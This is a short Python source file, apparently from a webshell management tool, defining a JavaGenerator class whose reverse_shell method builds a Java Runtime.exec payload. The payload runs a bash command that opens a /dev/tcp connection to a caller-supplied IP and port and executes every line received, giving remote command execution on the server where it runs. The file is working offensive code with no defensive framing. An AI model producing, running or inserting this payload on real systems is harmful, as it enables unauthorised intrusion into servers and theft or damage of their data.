"""Java code generator for webshell operations."""


class JavaGenerator:
    """Generate Java code for webshell operations."""

    @staticmethod
    def reverse_shell(target_ip: str, target_port: int) -> str:
        """Generate Java reverse shell code."""
        cmd = f"/bin/bash -c 'exec 5<>/dev/tcp/{target_ip}/{target_port};cat <&5 | while read line; do $line 2>&5 >&5; done'"
        return (
            f'Runtime r = Runtime.getRuntime();Process p = r.exec("{cmd}");p.waitFor();'
        )
